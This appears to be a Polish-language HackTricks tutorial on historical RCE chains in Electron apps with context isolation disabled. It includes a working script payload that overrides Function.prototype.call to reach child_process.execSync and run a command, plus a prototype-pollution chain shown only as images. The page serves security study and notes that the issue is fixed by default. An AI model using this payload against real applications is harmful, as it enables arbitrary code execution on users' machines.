# RCE przez kod wewnętrzny przy wyłączonej izolacji kontekstu w Electronie

{{#include ../../banners/hacktricks-training.md}}

Są to **historyczne wzorce exploitacji** dotyczące aplikacji Electron, które uruchamiały niezaufaną zawartość renderera bez izolacji kontekstu. Izolacja kontekstu jest domyślnie włączona od Electron 12 i nadal jest zalecanym ustawieniem bezpieczeństwa.<sup>[[1]](#references)</sup> Szczegóły implementacji różnią się w zależności od wersji Electron i Node.js, dlatego należy odtworzyć łańcuch ataku na wersjach dołączonych do aplikacji docelowej.

## Przykład 1: nadpisanie `Function.prototype.call`

Ten przykład pochodzi z prezentacji Masato Kinugawy na CureCon.<sup>[[2]](#references)</sup>

W podatnej, historycznej wersji Electron wewnętrzny kod ASAR rejestrował listener zdarzenia `exit` procesu. Ponieważ kod strony i kod wewnętrzny Electron współdzieliły prototypy JavaScript, gdy izolacja kontekstu była wyłączona, kod renderera mógł zastąpić `Function.prototype.call` przed uruchomieniem wewnętrznego listenera.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Wewnętrzna ścieżka kodu asar.js w Electronie użyta w przykładzie RCE przez contextIsolation](<../../images/image (1070).png>)

Listener został wywołany za pośrednictwem mechanizmu obsługi zdarzeń Node.js. Oryginalna strona zawierała nieaktualną ścieżkę `bin/events.js`; aktywny kod źródłowy z tego samego historycznego commita znajduje się w `lib/events.js`.<sup>[[5]](#references)</sup>

![Ścieżka kodu Node events.js osiągnięta w łańcuchu RCE przez contextIsolation w Electronie](<../../images/image (793).png>)

W tej ścieżce `self` jest obiektem process Node.js:

![RCE przez contextIsolation w Electronie za pomocą wewnętrznego kodu Electron - przykład 1: Gdzie „self” jest obiektem process Node.js](<../../images/image (700).png>)

Historyczny obiekt process udostępniał ścieżkę do `require`:

```
process.mainModule.require
```

Ponieważ dispatcher nasłuchiwacza wywołał handler z obiektem process, nadpisanie call mogło odzyskać ten obiekt i wykonać natywne polecenie:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Przykład 2: prototype pollution

Prezentacja ElectroVolt pokazuje inny historyczny łańcuch, który uzyskuje obiekt `require` przez prototype pollution.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Dokumentacja Electron - izolacja kontekstu](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Wykorzystanie braku izolacji kontekstu - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Historyczny kod źródłowy Electron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Pwning popularnych aplikacji desktopowych i odkrywanie nowych powierzchni ataku w Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Historyczny kod źródłowy Node.js - obsługa wywołania listenera w `lib/events.js`](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
